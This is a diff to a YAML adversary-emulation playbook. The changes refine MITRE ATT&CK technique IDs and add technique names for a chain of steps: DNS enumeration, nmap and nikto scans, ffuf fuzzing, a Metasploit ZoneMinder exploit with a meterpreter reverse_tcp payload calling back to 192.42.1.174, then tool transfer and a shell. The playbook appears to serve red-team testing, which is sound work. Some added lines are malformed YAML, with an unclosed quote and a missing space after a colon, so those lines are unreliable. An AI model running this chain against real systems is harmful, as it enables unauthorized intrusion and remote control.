@@ -19,26 +19,30 @@ commands:
   - type: shell
     cmd: dnsenum -f $DNS_LIST --dnsserver $DNS_SERVER $DOMAIN
     metadata:
-      techniques: "T1590,T1591"
+      techniques: "T1590.002,T1591"
       tactics: "Reconnaissance"
+      technique_name: "Gather Victim Network Information: DNS,Gather Victim Org Information"
 
   - type: shell
     cmd: sudo nmap -O -sT --top-ports 100 $SERVER_ADDRESS
     metadata:
-      techniques: "T1595,T1592"
+      techniques: "T1595,T1592.002"
       tactics: "Reconnaissance"
+      technique_name: "Active Scanning,Gather Victim Host Information: Software
 
   - type: shell
     cmd: "nikto -host $SERVER_ADDRESS"
     metadata:
-      techniques: "T1595"
+      techniques: "T1595.002"
       tactics: "Reconnaissance"
+      technique_name: "Active Scanning: Vulnerability Scanning"
 
   - type: shell
     cmd: "ffuf -w /usr/local/share/SecLists/Discovery/Web-Content/raft-small-directories-lowercase.txt -u http://$SERVER_ADDRESS/FUZZ"
     metadata:
-      techniques: "T1594"
+      techniques: "T1595.003"
       tactics: "Reconnaissance"
+      technique_name: "Active Scanning: Wordlist Scanning"
 
   - type: msf-module
     cmd: exploit/unix/webapp/zoneminder_snapshots
@@ -49,9 +53,9 @@ commands:
       LHOST: 192.42.1.174
     payload: cmd/unix/python/meterpreter/reverse_tcp
     metadata:
-      techniques: "T1190,T1059"
+      techniques: "T1190,T1059.006"
       tactics: "Initial Access"
-
+      technique_name: "Exploit Public-Facing Application,Command and Scripting Interpreter: Python"
 
   - type: msf-session
     stdapi: True
@@ -60,6 +64,7 @@ commands:
     metadata:
       techniques: "T1105"
       tactics: "Command and Control"
+      technique_name:"Ingress Tool Transfer"
 
   - type: msf-session
     session: "foothold"
@@ -67,6 +72,7 @@ commands:
     metadata:
       techniques: "T1105"
       tactics: "Command and Control"
+      technique_name:"Ingress Tool Transfer"
 
   - type: msf-session
     cmd: shell
